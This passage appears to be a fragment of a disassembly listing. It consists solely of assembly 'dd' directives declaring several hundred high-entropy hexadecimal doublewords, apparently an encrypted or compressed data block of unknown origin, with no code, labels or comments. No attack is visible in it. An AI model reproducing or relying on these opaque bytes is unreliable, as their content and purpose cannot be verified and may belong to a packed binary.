		dd 0A8A0694h, 9AC0260h,	7A9E6BA3h, 1C24BFD2h, 0CDAC986Eh
		dd 87621516h, 0BF3D0CADh, 9A620B83h, 0C66734Bh,	0A023FD81h
		dd 332C4B41h, 66B73191h, 29A56CBEh, 4EA6866Ah, 0C6683F5Bh
		dd 76A93675h, 0FA21DAF9h, 0B0FC21D5h, 8FE4BB38h, 72254BF8h
		dd 12DA650Ch, 6541C400h, 0FA44379Bh, 0D6BCBB9Ch, 0BBEBEB6Eh
		dd 3222152Eh, 0C5311800h, 0F6A80F2Fh, 0CFC77012h, 180F0AB4h
		dd 0A76EEC7Fh, 0FC9A0997h, 3CF9E7C9h, 8076DD1Bh, 0FCE4CB22h
		dd 0C0D10D4Ch, 0E3BA625h, 3284B400h, 64F57988h,	3240D275h
		dd 1A719EA5h, 0E4245391h, 0DC655C21h, 214DC57Ah, 0F1E5BE7h
		dd 0A76F2514h, 0AF304699h, 0BB38069Bh, 229CCDB8h, 45C441F5h
		dd 75DBEF4Bh, 0A0F12E66h, 0DF16F2A2h, 534B946Ah, 675849B5h
		dd 6898D39Ch, 8D120343h, 69F42C51h, 0D08A116Fh,	0BCEB21DFh
		dd 0EC170487h, 9D87AED9h, 0B3758A3Eh, 0E47FB688h, 8947C96Ch
		dd 35E1C8FAh, 6567E72Bh, 1A00B24Eh, 6183B7E9h, 80616F0Ah
		dd 4305F169h, 983A3980h, 14A15744h, 344F00B5h, 2D2F93B7h
		dd 0F2CEA22h, 96B7A72Ch, 57AB9B20h, 1AFDEA49h, 69DFE9E8h
		dd 0FB250E24h, 0EFA23F9Fh, 5ADB8FCFh, 77F2868Ch, 0CBDAAFD1h
		dd 7975499Ch, 1F78FA97h, 0BDE384D5h, 0BBC7DEBEh, 0E16BA327h
		dd 0AF2AF6C8h, 0D9855DABh, 71BD23E2h, 49876F37h, 0F8E3F9C9h
		dd 0E7BF0A07h, 0AE3C39B9h, 45100ACCh, 9A5C457Ch, 6DC1022h
		dd 8AF1052Ah, 7763E7FDh, 40A07902h, 0CA136BB3h,	11D9D2BDh
		dd 0E3D711A9h, 3E322B69h, 0A2FEA8BCh, 49B65122h, 0B4957B01h
		dd 22E9BE4Eh, 6B33D306h, 0D24B0F22h, 7D0CB0F6h,	1D39E52Eh
		dd 841D5308h, 0CDD63488h, 0C7A8AC07h, 0BD1CAFC7h, 4D6E2FEAh
		dd 0F83FE5DAh, 2C00921Fh, 4B7495Ch, 29FC7254h, 8FA4EFD2h
		dd 0DF74604Eh, 1FE0128Dh, 0C9329350h, 0ED6E0024h, 0F14EEC59h
		dd 0A77B6738h, 5D64EE32h, 26287Bh, 454BFD5Fh, 0FF1C682h
		dd 0DB9705A3h, 64CCDEB5h, 7945FF9Eh, 7028E333h,	768B08D1h
		dd 0EA547581h, 3E3FE2E9h, 2CC2072Ch, 88071F8Ch,	0A077615Fh
		dd 3F63F23Ah, 0F6A4099Fh, 0A2E27900h, 0CED4DDC0h, 0BE172125h
		dd 0CE394F6Bh, 0FB84274h, 0CD405D52h, 5FA8BDB9h, 0DD893CEDh
		dd 0C1403BB3h, 0FA81AE47h, 5AB59BBEh, 0EEA484B2h, 0C93DADAEh
		dd 6EDBDB78h, 0E05ECAEBh, 462C103Eh, 0B379CD6Ch, 0FE63B887h
		dd 0A978E42Eh, 8EB98904h, 3F21A3D8h, 0C678BD5h,	0FF307B8Fh
		dd 9F77F627h, 0AA3FCD9Bh, 41C1C76Bh, 9A2AC7E7h,	0BFA43D3Fh
		dd 0A3B6597Bh, 5A6C1F5Eh, 0C698D979h, 49385FEh,	8BEABAACh
		dd 8809F57h, 0C8EA85E8h, 0C95B801h, 8CA7B358h, 611D8640h
		dd 0CDB4DABAh, 0A26A8DEBh, 183A31B7h, 0A7613745h, 9F94B6B9h
		dd 0DD36DC78h, 0A4997766h, 0ECA558F8h, 266F4E33h, 1B6A3D59h
		dd 3B49BCF1h, 856D1CA2h, 0DFE97236h, 7E401A85h,	760BE839h
		dd 9B4418F7h, 9E716542h, 0F8D9A4FBh, 91DB447Bh,	364931C6h
		dd 42643AD4h, 0AFEC0CC0h, 52A218BDh, 3ACD3A74h,	0FA77BA13h
		dd 879CEA63h, 459453B7h, 0DB5BDE23h, 0F7D2FC59h, 0B38772E0h
		dd 821E4316h, 85A61D01h, 0A68B2C34h, 22944852h,	8F8288DEh
		dd 6DF50B8Ah, 0E1508A32h, 57CF4FE1h, 51EC39E1h,	0D756DE38h
		dd 5C53F46Bh, 838DA3EEh, 0FFCC7570h, 0BF001F12h, 930D22B5h
		dd 9D396D30h, 73B23843h, 0A621CB5Dh, 3E60D858h,	69BA7EFFh
		dd 56ED7C91h, 7618D245h, 2102D11Ch, 5AB88E1Ah, 0ADDB57CCh
		dd 0B6E6F79Dh, 9B77B105h, 0A289F381h, 903254F7h, 6659CFB2h
		dd 90A3F47Dh, 0D9AEB2CBh, 0D4B0E1D1h, 90DC7AB1h, 2BA1705Ch
		dd 3D5F4F8Dh, 33CF8FFBh, 36E412F7h, 7A3DEE8Eh, 3FF169F9h
		dd 240975h, 2506D25Fh, 0AEF560C5h, 31640E35h, 3BD4B2F9h
		dd 734C0B23h, 0AB7203A9h, 999038ABh, 0E4E473h, 819BF6CCh
		dd 0BC95FFC5h, 4781C63h, 66F84978h, 79C54A84h, 8F3F97Ah
		dd 8FFA060Ah, 22617CA9h, 0D4D7228Bh, 6FC34931h,	6C5F339Fh
		dd 0FE36322Ch, 5C329C21h, 9E4CCBD5h, 0D0157298h, 395A31EDh
		dd 2D8EDCBh, 25C573FFh,	0C162A16Eh, 94EEC0DDh, 0AF340144h
		dd 0DDA67EF8h, 7791D62h, 0C55A466Dh, 0EB3F2C3Ch, 34794EA5h
		dd 0E0CDD57Dh, 7ECD5716h, 7CB736D8h, 2E446EA7h,	0F6746CBEh
		dd 37796478h, 89B3E0Bh,	3050733Eh, 0FF495086h, 912DB0EDh
		dd 0ECBF5DCFh, 8FDF4E6Ch, 0D9A67963h, 3CD8012Dh, 0AD0C6947h
		dd 0A2968C76h, 0FD0F4B95h, 0E8F83CD8h, 27C05203h, 0D9D66033h
		dd 0BEECFF7Dh, 4CBC5877h, 0BE3BF2A8h, 356601E3h, 109AF36Ch
		dd 992A4676h, 0A7E64844h, 8068A0C4h, 7488A4D1h,	147EF86Dh
		dd 4AD7B3B4h, 0F7A0354h, 85EF9DB4h, 43DE893Ah, 73DC8E87h
		dd 991A52E2h, 0DE11007Fh, 6B0B1B8Dh, 5DE5804Dh,	0C9E65754h
		dd 0B526C975h, 8F82C31Ah, 791B151Dh, 0E64CA3ADh, 7A139656h
		dd 0A8405CC5h, 0A281F328h, 9512A03Dh, 1588EE46h, 0F8A338FEh
		dd 1D3713D6h, 0ED0F9A69h, 0C937F5E8h, 17AEBC90h, 24C4FC0h
		dd 57E9520Ch, 0A237190Eh, 0BF3A101Dh, 0FEFF7D08h, 0D1A91C3h
		dd 3FAD4CC4h, 0AF7B1C9Eh, 0D1DCF3D7h, 0D2A22CCDh, 52A2704h
		dd 60CB1A56h, 0A7DBD78Ah, 0CF038C90h, 4D2B9766h, 9CEF7DAAh
		dd 1EE47214h, 81C3FC02h, 73154327h, 0EA3042BFh,	263C69CDh
		dd 0B4BF2876h, 66ACFC78h, 0F239FF69h, 1A5C89ABh, 0FD5B7C67h
		dd 2734F55Eh, 0D39E7774h, 5DCF113Ah, 0BB58365Dh, 814AA236h
		dd 0E25A3082h, 83D84D9Fh, 1B9BC6A0h, 955D1086h,	5A03F005h
		dd 5EA9A70Eh, 0A6D45F3Fh, 2ECFEE4Bh, 0E3C693ACh, 7B65873Eh
		dd 0A9BE1A86h, 105C786Bh, 1EFCA121h, 42365D3Ch,	96D4C448h
		dd 0A423EE6Dh, 0B8443727h, 0B8A31FF9h, 0A5460A21h, 33669252h
		dd 76D25DE2h, 0FA48208Ah, 0D0B72108h, 20145604h, 62312CC1h
		dd 317DAF3Fh, 8BB93854h, 8F6FBBA8h, 0A1886B4h, 6410E4Dh
		dd 0A4D85603h, 6353810Bh, 0C3A58FE5h, 805FD072h, 80C4AA4Ah
		dd 2C07DC96h, 27FAD904h, 0D885549Eh, 0FFDBB368h, 0EE376768h
		dd 200342D3h, 75955933h, 0E993F848h, 4CE22261h,	0A2A2FE92h
		dd 0B43FD6D8h, 4D764A43h, 0BFEF0F4Ch, 0DC0E7F95h, 6E960891h
		dd 0DD6EEF5Bh, 0FD6B4872h, 0E0F9057Ch, 0E712EC55h, 705CD581h
		dd 445992BFh, 0E42DFAC2h, 36D770Eh, 7F8D9E55h, 6330EFE5h
		dd 6B3A11AAh, 6DD43C2Eh, 76D49E13h, 75F7ED4h, 41FA7038h
		dd 0E7E89E2Ah, 78273DDDh, 48221AE5h, 989CD950h,	674324ADh
		dd 2B919C27h, 9103A5A7h, 46D90BFBh, 249DA602h, 0FF271712h
		dd 2FF6C57Fh, 7C64C7D8h, 0E24835AFh, 660C9931h,	7E1B431Dh
		dd 0A3A9384Bh, 0D1AFA3Bh, 15AC5144h, 56497BE1h,	0E8A74044h
		dd 20020A86h, 0E4FD63A6h, 63013072h, 8C2AA235h,	0F1566E6Dh
		dd 281B89BDh, 863060F3h, 66ADDEBAh, 52617836h, 47E919CCh
		dd 39AD68C2h, 0D2ED9836h, 2375BC73h, 5D275DC5h,	80A25370h
		dd 0C9B8E028h, 8FF36C7Eh, 3AC9DBh, 0B7D6008Ch, 8819BDFDh
		dd 0E2CBF96Eh, 72228EA5h, 9717F1Eh, 0C5C9575Fh,	0ED1A5E39h
		dd 0BEB636F9h, 0BD142229h, 0CA4F621Dh, 767622ABh, 0B82DEA06h
		dd 562BD8E0h, 95C449FCh, 666220B4h, 3563C611h, 0DB1D4DB6h
		dd 4AE6FC76h, 0D1F54FA8h, 8EC6E314h, 968964Ah, 90FBD619h
		dd 732B1F58h, 0F7FA0FADh, 10D6D7A7h, 2982E51Ch,	0F7B56080h
		dd 0B4B919B2h, 0C863E492h
		dd 0FA8DE824h, 0E40C9366h, 0A816174Ch, 0D63CCFEBh, 8B3D10BDh
		dd 35B838CEh, 1B238E0Dh, 7B835F5Ch, 0B8AD18D9h,	6C1F9BF0h
		dd 78DC10BEh, 0D46D26CDh, 0F6340702h, 3653B8D8h, 0E3051446h
		dd 0FA6094C5h, 700161DFh, 7B03DE8Dh, 0D2984AF8h, 858D5CB5h
		dd 8CBA116Fh, 0F40063B1h, 0C8DB1805h, 74745271h, 0A81AE278h
		dd 0F7ABD50Ah, 6F44F2A0h, 0C92553B6h, 0D6BB32A5h, 95F04FC7h
		dd 11EF54DEh, 0F9DDE332h, 89EC20BAh, 534E4ABCh,	0E65A5D95h
		dd 0CE7FD102h, 1BF25CBEh, 0C75BAB20h, 75B21003h, 1D8036CAh
		dd 3D06543Eh, 2D05373Dh, 5569BA5h, 1E5957F3h, 0DC88FC91h
		dd 2ABE4D3Bh, 6EF08FFFh, 0B745691h, 0B03D168Fh,	0B14A630Eh
		dd 0C2DF62Fh, 0D3A7E2E3h, 0AD845040h, 3138AB4Ch, 5646BD73h
		dd 4FF1C844h, 0DED7C110h, 8B7E7C59h, 1FB93EEDh,	199B0BBFh
		dd 8B131A53h, 49AD0E3Ah, 9CABB067h, 40408887h, 0CBB81998h
		dd 0D4123C06h, 1D9F770Ah, 1C2801A2h, 0C77CE5B6h, 46C78D25h
		dd 8737BD03h, 995492CFh, 1A1378D5h, 57CB0A66h, 187057E4h
		dd 0F9FF7798h, 0FF44ACFh, 8E53371Fh, 6AC28CC9h,	1FC94054h
		dd 0ED7A6A0Fh, 0BD543FD5h, 718CE353h, 67F62CF1h, 0E0931654h
		dd 0F0FEF3EBh, 0CBC18C96h, 6C6BE34Eh, 0D183BEF8h, 4B0CCF4Dh
		dd 0F0BB6906h, 0A7F6E287h, 0B52D265Eh, 2D4B9A94h, 3BEBC9B0h
		dd 0E25FDDF3h, 0C0BAC97Fh, 0AAA7E8EEh, 0E635022Ch, 4AF54036h
		dd 0DB7E1C31h, 1E719979h, 0E4852A1Ch, 5424A46Fh, 0F1D6BF02h
		dd 702C801Ah, 0E077EE4Ch, 89AF1969h, 0F7522C82h, 41C6EC26h
		dd 0AF6023ADh, 63133BC6h, 0EBA3A38Bh, 468C3F6Eh, 837CCBD6h
		dd 63558E40h, 8AF74C3h,	48EC66C6h, 6C007544h, 9257036Fh
		dd 0CD09010Bh, 0F968D94Bh, 0C84E05Eh, 55A9B7D3h, 0BFE17DDDh
		dd 15437568h, 41F33CF5h, 3BA7F7B0h, 6971DB54h, 0B7632BC3h
		dd 11B38ED9h, 0EC582FCDh, 80A64273h, 0E6AB6556h, 6FD3654h
		dd 3B58969Eh, 94A359F3h, 6C2D32A7h, 4E4CBDD0h, 0C1D5589Fh
		dd 26FD0640h, 0C9492944h, 0DAAE6D28h, 3F2695CEh, 5A242950h
		dd 4F9961EAh, 9A569128h, 5E9FF1FEh, 83E0751Ah, 26185CB5h
		dd 0C0CF2EFh, 4CB5A1Dh,	5FD641BCh, 162BFCDh, 0C2984DB8h
		dd 614F4C57h, 32D3071Ah, 4FBFC63Ah, 0A73AF21Eh,	0FE7D5FDEh
		dd 5D4459C7h, 0B5D844E6h, 29AD22Ah, 5FBD76ACh, 36E0050h
		dd 0E9221D79h, 0A7338E8Ah, 0B89184C2h, 2251F6FEh, 686CA474h
		dd 0F22BE961h, 699D00B8h, 1E4FC900h, 0F4BF7E6Dh, 9D475052h
		dd 5DF55FAAh, 9FCA230Ch, 0D5F4E912h, 4A463354h,	0EFA19E18h
		dd 0BAEEF537h, 26FE1D13h, 255C64EFh, 6D4A39E6h,	1408F970h
		dd 493E0D4Bh, 1F4012FAh, 1D811AADh, 5FFD2036h, 9E89365Dh
		dd 8E6EE30Dh, 753CE579h, 901B80F1h, 8F75883Bh, 8EC65C97h
		dd 0DE43BA39h, 35095C66h, 39E5C1Ah, 0FB1B6295h,	8B551F89h
		dd 0D455B18Ah, 0B6DA4FEDh, 7C67D3DAh, 60D3440Dh, 0E1BB0DBBh
		dd 8FBE3306h, 0C805441Dh, 3B049F94h, 218D03F9h,	0F895CF0h
		dd 352DE9D7h, 4706DA78h, 0ED64BDF8h, 4B4025D4h,	0C125E63Bh
		dd 0DD810BDEh, 15EA6F2Bh, 6A38ECB0h, 58DA1899h,	0F7F879E5h
		dd 3901574Eh, 0E2317D80h, 0A212FD7Ah, 0C41F4159h, 0E6FEFC1Bh
		dd 31A42721h, 5F5F50BCh, 0D65E267h, 4B709D3Ah, 76925C2Bh
		dd 0B4207F20h, 6728FCDAh, 66F06FCFh, 9EE61551h,	785D1062h
		dd 0FE9B4BAh, 0D06BE5D8h, 0BFFF9D12h, 0AEB174C9h, 0D86F8ECBh
		dd 35D81E24h, 3F9A8711h, 84D51361h, 0C925DD7Fh,	0CB6B3A19h
		dd 0C6BA443Eh, 3A948474h, 2961DECDh, 0A9261AF6h, 2336F497h
		dd 7C6C23FCh, 9B7EF76h,	1DC51670h, 0C525BB96h, 0AAFE6A3Dh
		dd 0A3A22095h, 0B506DCC5h, 2E17CCBEh, 0B12910ABh, 0B6BCFBD1h
		dd 0ECB02658h, 6B32F5A2h, 7EC0D2B8h, 1E9E66B4h,	5D4726DCh
		dd 0F10A044Ch, 921EA81Bh, 0C7A537ACh, 745FC753h, 198FD3EEh
		dd 89A8E757h, 9A853226h, 0D1AE5520h, 7D32CE3Fh,	5F05331Dh
		dd 809B59CBh, 0D6C95F77h, 0BE1ED2Ch, 141B86F2h,	5DD9F7B8h
		dd 23CA00D0h, 39FDD6F7h, 18ACC23h, 0C7EF9C4h, 798586CEh
		dd 53D7D2F0h, 8F574AB0h, 59B43176h, 371CEF41h, 0F69627Ch
		dd 6C9F7A69h, 27D8C2D0h, 3BEFE189h, 0E13D8833h,	5C12902Fh
		dd 4CF64AE0h, 9384A024h, 14FDE55Ah, 0BED9CAA7h,	9EEB949Ah
		dd 985CF367h, 83566B22h, 0B03CCC03h, 674D627Dh,	1AF1133Fh
		dd 0C4C0671Fh, 81B6BA45h, 0B8D6AC74h, 90CCE942h, 10E9AE84h
		dd 8E887F68h, 0A86CAB29h, 3D6245D6h, 0A91B9592h, 5BBB8ED0h
		dd 0FBF694E4h, 697CD4EBh, 7E9C7A01h, 1F30CCC2h,	44E23DAFh
		dd 2B52024Fh, 0FF51773h, 3271A73Fh, 2AC3DD23h, 29A26852h
		dd 0FDFF62C3h, 48B9F30Fh, 13B2A12Fh, 4B42CE51h,	0DBF9A562h
		dd 0C3A23E21h, 0B72F957Bh, 9B7C9CCh, 0B2D7DEC6h, 0CF47461Eh
		dd 681EEE08h, 3A7CCD30h, 0C72D25F9h, 9B6366F3h,	0CA8874ABh
		dd 72DD0A50h, 0FD6F2EA9h, 1CF237BEh, 0F17552E9h, 305671E6h
		dd 9DDB6527h, 3F223261h, 0C927C71Eh, 7BEFF598h,	0B01B80A8h
		dd 0C6925A7h, 8A590447h, 912A3C20h, 7CC5E11Eh, 0A3B98830h
		dd 84CD4DD0h, 84A90009h, 7BCAB274h, 21A3B1A3h, 0C8AEBCBAh
		dd 421C2142h, 5A9B5857h, 38C6A32Bh, 548AD590h, 2087E723h
		dd 64B33D6Ch, 0F959E30Fh, 14081711h, 0AD57DE15h, 5739B9ECh
		dd 0C979D85Ch, 0D4AA5812h, 39CE62F8h, 0C38A853Bh, 9C37A18h
		dd 0F9273077h, 0B89F331Ch, 0CB48D3E5h, 651561ACh, 9C1F0DDBh
		dd 0FA47E774h, 68F43CBFh, 54731172h, 0F89CC91Eh, 0CFACD074h
		dd 2DAA8648h, 3103FACCh, 0D959BEAh, 209BDA3h, 6A1DD04h
		dd 64367F28h, 0E8EDDC25h, 12D82195h, 625D173Dh,	15BCB141h
		dd 71F54B7Ch, 17949EFDh, 197CAC58h, 510FA5Dh, 66420934h
		dd 0DE20D661h, 5565281Dh, 0EA02A55Eh, 2356B39Ah, 3D53AEE9h
		dd 0BD1C62C1h, 9B56DAF3h, 0CDD346Bh, 8DCC0CD4h,	0ED191DBDh
		dd 882293F7h, 9DD2602h,	4D68A47Dh, 0AB0D67F8h, 42580C46h
		dd 0D6FCE14Ah, 0BD08FCE7h, 3FEA6B17h, 1898DC44h, 0D0272A89h
		dd 0FB7D27DAh, 8A383D33h, 0FF75B8B1h, 4DCB5B24h, 0EBCB240Bh
		dd 21D04664h, 63E67B20h, 625098CCh, 8DFA3E45h, 0D8459E4Fh
		dd 3DFABDF5h, 59B6B645h, 46740E2h, 460FD1E5h, 0D96BDE64h
		dd 929F7053h, 8D9221D4h, 0BC35BAA4h, 73278D41h,	215CC858h
		dd 3EB0BA16h, 1849F35Eh, 0E653829h, 5DF7F8C0h, 356F517Bh
		dd 18794ECDh, 0BE65D34Eh, 0C5FC4933h, 65A00277h, 210F84DBh
		dd 0F26F6C95h, 5DE443FBh, 82DEBF3Eh, 19CE8A5h, 206F941Dh
		dd 0DB68FD57h, 715ECB29h, 0F9CBD106h, 0AF389AB9h, 53E35BEh
		dd 66906F2Fh, 98D4EA88h, 396E9D1Fh, 89C1FBBBh, 4286A3Ah
		dd 3656A3DEh, 0C86D4130h, 0C9F32746h, 0E2E162A9h, 15CB67A2h
		dd 0EE3BEE8Dh, 2754490Dh, 0A02C0D6Bh, 68806131h, 0A2DEB63Ah
		dd 32D74549h, 7008E60Dh, 0F217A246h, 0F165236Bh, 888A9BDh
		dd 0DB451A93h, 84016D77h, 0EC736D2Eh, 0F30851D1h, 8350927Fh
		dd 588C71EBh, 0D6A5EF51h, 8A0A5A8Ah, 90DBE821h,	6DE9ED86h
		dd 0B133B6E9h, 0E3374809h, 15D794CDh, 1C2B46C8h, 1395F34Eh
		dd 92D21E44h, 0AC0CCE3Ah, 7897A8F0h, 0F4B481Fh,	54A81DBFh
		dd 3DF691ECh, 0BD45B269h, 0CAD8E7FDh, 0D20C54CDh, 0BEB646DCh
		dd 0F34E4195h, 6123EE68h, 0B01D06F5h, 0D00FA335h, 689052EAh
		dd 0F6E18EF9h, 0BD839D5Fh
		dd 30B7C59Fh, 4C78F838h, 0DCC9A4C9h, 0DD2573E0h, 73F4DC87h
		dd 4A665E75h, 0C97D53EEh, 7ACADB1Fh, 7E610C53h,	0C4A2AC7Fh
		dd 0A14BF44Ch, 4CEA955Dh, 62C1B5D8h, 884049DCh,	387AB888h
		dd 0AF1F5F36h, 0BA3DCA48h, 0C1891BD7h, 68ADF0E8h, 19E64DAEh
		dd 30FCB9D6h, 0B4C38FBh, 0BF5DA819h, 669BEE3Dh,	0DCFC580h
		dd 0AE16D6A8h, 0BEC6751Fh, 0A1F37AF1h, 445A01B9h, 80CA350Ch
		dd 7C0C2E6Ah, 0DEBC76CEh, 2CFB8DAh, 25A7CC01h, 6BE5F291h
		dd 82DF0758h, 0AE5A933Ah, 45437D39h, 61D22799h,	0A8F97302h
		dd 1F9C945Bh, 90ACAB93h, 76D6E21Fh, 1249EEFAh, 16359F96h
		dd 0AC78EA60h, 68A7C5CBh, 905892CDh, 0BEB30D8Ch, 0CC85C1Eh
		dd 0E365B6CAh, 0C889D519h, 0FA041BEBh, 59CA37EBh, 0C2D0074Fh
		dd 0B513F044h, 671A92C5h, 8AD7DC5Ch, 0A87C36CEh, 8F641210h
		dd 33443206h, 5CCD7F95h, 3B41133Fh, 0FF6A9374h,	0E1C33846h
		dd 5D7C6C60h, 1E1FE800h, 67248A65h, 0C6511DAh, 11A5F9A9h
		dd 0AE7BFA73h, 31F34FF9h, 0E7E7864h, 1E7C254Eh,	0D62DF0FFh
		dd 0D97A7FD7h, 8C87C6E4h, 1A9A59FBh, 0D0970CB7h, 0B6FE9130h
		dd 6AC8DF35h, 0BE4AE5E3h, 5B31B95Ah, 2AE6717Dh,	7EB720C3h
		dd 36DD1FD0h, 9ADD9F68h, 30B7FD3Bh, 633A8344h, 0B2C02E80h
		dd 0E52829ACh, 364646F8h, 7625AF5Ch, 3088D69Ah,	0A3CE158Eh
		dd 0C2BCE5EFh, 0BACC4C1Eh, 9CF7516Bh, 2868171Fh, 0AC95B9C4h
		dd 5C6E33A5h, 67A49F16h, 6EB99EEBh, 560389FBh, 0C0C1B8C7h
		dd 5D9E0B58h, 0D021E042h, 0B7E8AC98h, 5F9E8A7Ch, 0C8B04202h
		dd 84C14F5Ah, 9DC33D21h, 5C2E0303h, 92AEBE29h, 798967F3h
		dd 67B95DCEh, 4B3DAB4Eh, 90A4061Bh, 5696D80Bh, 7F73A7EFh
		dd 0E64D849Fh, 2286CA06h, 0F5B0B41Fh, 0B49806E0h, 2F28B310h
		dd 3A5B78AFh, 0D1D3164Bh, 0C0D18352h, 0EBEA3A3Ah, 7D99DE64h
		dd 87FD88B3h, 0E99DD7ADh, 1CC9C004h, 83536BAAh,	29ACD426h
		dd 0AB3A96E9h, 40C8A1B8h, 0E18A0751h, 2E54D007h, 0F9A5345Ch
		dd 50D278BCh, 159EC72h,	0AF771404h, 4E35A71Dh, 0DD8A5EF7h
		dd 18B1B4DDh, 7750E238h, 97987B6Eh, 920C41C7h, 0F96A5342h
		dd 5DEB5B2Fh, 87776AFDh, 0EDBCAE4Fh, 0FCE215BEh, 0FA56D766h
		dd 2700E7CBh, 0C59EB8A0h, 4E785CB9h, 0A78A46A7h, 26E6A605h
		dd 34EB3756h, 1CE80F57h, 63A816B2h, 585CF860h, 0E430B101h
		dd 0DE2B86Dh, 7941E53Ch, 0E55805F4h, 1C63DD1Ch,	3F5A21ADh
		dd 9586A004h, 1FB5C0E4h, 6C6A37FAh, 153449F4h, 0F7396D17h
		dd 0DB36584Bh, 74A31F24h, 0D3C553Bh, 2B2EEB71h,	0BB72ECBh
		dd 0AE1D8AA8h, 27747CB7h, 838C72D4h, 0E232D22Bh, 1566953Dh
		dd 0A98E0822h, 0A7357003h, 14B3D5C1h, 8A46D08Bh, 0EE6B9B8Ch
		dd 4A75396Ch, 279546FAh, 979B77A1h, 0D2FA4024h,	246132D0h
		dd 8C8FD802h, 0F0C17F28h, 0EF04A903h, 35BB736Dh, 0C825FB13h
		dd 0E8B77408h, 1A1DFD2Bh, 68AD67CFh, 0DF223E46h, 0B0CB1B9Fh
		dd 6D5D649Dh, 9E7086h, 477BB28Fh, 0D3A415DEh, 0B18A043Ch
		dd 5C74D94Ah, 0C89B5E2Ah, 99A52409h, 1C474C24h,	8F665CFFh
		dd 6768EC9h, 4DCEEB20h,	0CDE1352Eh, 2C012016h, 0AA3FA548h
		dd 0DC77369Dh, 29AB9C89h, 91B74917h, 0FF043BE9h, 1335BFE6h
		dd 189ABC29h, 0BDF074F7h, 5F6F5E2Eh, 0D2A00D5Dh, 95457400h
		dd 0B3FD8359h, 0A7813789h, 0EC32C932h, 10430682h, 0F61B1525h
		dd 2BF52635h, 0ABD6DDE7h, 0CFECAD98h, 0BE7109E3h, 28290E6h
		dd 7845EE19h, 0B34F6CC3h, 8CA4FF36h, 3BE0CEC0h,	0BE07F2B4h
		dd 72DC7B6Ch, 1DF5580Fh, 0CD1CE02Fh, 3371A4E6h,	0C8FA5F16h
		dd 0BF6BCFAAh, 1004F2BBh, 3FA725EEh, 0B00F2FF3h, 5CF345E9h
		dd 5B217CD7h, 0EAACBAEAh, 8B250ED5h, 87F6E45Ch,	751292CAh
		dd 163D33D4h, 8195DEAAh, 0DAFAAC63h, 0E1562754h, 7B6BC4C4h
		dd 763B5AB7h, 161393BAh, 63E38213h, 25E2F4C4h, 0EECCBA92h
		dd 7355983Fh, 35F46225h, 81B7C10Fh, 0A6874E31h,	3473343Dh
		dd 0D7178324h, 0E83D4428h, 347BCAF7h, 0E18F91E0h, 1D31557h
		dd 0B882009Bh, 0ECAFE97h, 0D67B27F9h, 33807183h, 39ED4AC3h
		dd 0B2FF92C9h, 0BA40188Ah, 15FDDDE0h, 0F0176DD6h, 1C2BD6D6h
		dd 0CBF1620Ch, 7A76633Ch, 47565F96h, 35084281h,	590FF7AEh
		dd 73F045E7h, 0B343B4Fh, 24DC7DA6h, 0A1EABF6Ch,	2F163763h
		dd 0CB82E68Bh, 6D396C23h, 82C08B04h, 91823A35h,	0E7EF037Dh
		dd 58B05ED6h, 777772DDh, 0F0791883h, 0CF5A9EE0h, 73693689h
		dd 9B72687h, 0A0DD964Ch, 70F0DC0Fh, 1B2A4189h, 0D5240FFAh
		dd 818171FDh, 4F3D11AAh, 0A9124F82h, 0C963E346h, 0F915E7C3h
		dd 3F58FBD9h, 0B1E38E26h, 0FA0CC8A2h, 94D3A8DCh, 1CE8E69Eh
		dd 8A86EB70h, 4589839Fh, 0F8B45CAh, 303A6377h, 79EA2E63h
		dd 6163D556h, 96D73632h, 0C56E675Bh, 0F06ED262h, 735A464Ch
		dd 541A8295h, 43FCF285h, 0C7D52280h, 57A10FE6h,	25D431B9h
		dd 0D90EDB96h, 60F0DC08h, 51A25445h, 175872C8h,	0D6703F40h
		dd 0EEA876D2h, 491DC7ABh, 0A4AB0678h, 8D80A107h, 3771856h
		dd 0B98166CDh, 655DF278h, 0DB0D8960h, 157E10C4h, 8A1DED91h
		dd 0EC62579h, 92FC0172h, 9B6A68CEh, 8B8AEB3Eh, 0B5E163D5h
		dd 0BD1862Ch, 0EA87C51Fh, 22E204F9h, 0B5917B8Ah, 62A10EEFh
		dd 7530BD6Bh, 4C8C7396h, 0E487CD25h, 0B615416Ch, 0E6A327B1h
		dd 0C2ECAE4Ah, 383C9152h, 0AF00B633h, 2C86195h,	28C78C80h
		dd 914D143Ah, 17F20ECAh, 4037C85Bh, 0E1AEF4EEh,	0EB5F5513h
		dd 0E48DB7CDh, 10CAD83Fh, 472DCAF9h, 0CC7DBDA0h, 0EB04A24Ch
		dd 6178E93Ah, 4F3A43Bh,	1E3258B0h, 88CDF573h, 0DCAD8A45h
		dd 0B6A0DADFh, 3D82C3AFh, 0D4865B1Ch, 0E331EB77h, 3E3CD4E6h
		dd 38D66C54h, 8974F2E4h, 62DCACF9h, 5A931AEDh, 0D26D8D15h
		dd 51035D8Ch, 5A784190h, 6D47DA5Dh, 6555563h, 253A099Ah
		dd 0AA52C170h, 0D9D21437h, 73507D0Ah, 0C81EC51Ah, 69C0B200h
		dd 4442AB73h, 1BCFE5FEh, 68969478h, 0BFE52C15h,	0F8501083h
		dd 6A23C9BDh, 58C96E21h, 6E33569Ah, 78D56F3Dh, 5F69323h
		dd 0C6A68906h, 49CD103Eh, 40394E29h, 681284A9h,	71F6E25Ah
		dd 0A2474CF3h, 6BDC7532h, 0AF1480C7h, 3092F55h,	0F597CAF4h
		dd 2F8D4272h, 8045435Dh, 0C2F4D11Eh, 1245A971h,	762C916Ah
		dd 363E0387h, 8B671ED7h, 0DB00F04Bh, 0A05E4D96h, 0D63E4AF5h
		dd 0D35F1AE1h, 0E280C43Bh, 6C41636h, 0A22F2703h, 0B89603DCh
		dd 0ADCD5340h, 85AFC74Ch, 16A85D6Fh, 1919415Ah,	0F56ABBB2h
		dd 3247D941h, 1EB8BE91h, 8CE81549h, 0A533B361h,	0AA38A297h
		dd 3D6AB05Ch, 49439CCFh, 3FD96B0h, 0DB604904h, 0EDB57E0Eh
		dd 793BCD5Bh, 5716493h,	0C0295722h, 90FCB077h, 0E93276Dh
		dd 0CD645A17h, 0F1B20254h, 934264Bh, 0D2ED9B3Fh, 1984354Ch
		dd 0B01CACFEh, 0E766814Fh, 1D22AEF9h, 4E83816h,	249B1DAh
		dd 2FE2563Dh, 81C84F67h, 1DCBDD60h, 0E43A2A18h,	86234EA5h
		dd 4793EBA4h, 63536C28h, 3DB6C79Ch, 0DFAD9198h,	89E5F581h
		dd 773798C9h, 0C7CB1718h, 0E60B39A5h, 0F7618511h, 0C6570F50h
		dd 9D3F8DF6h, 6CA96729h, 639D5338h, 7502CDDCh, 0C37F6C94h
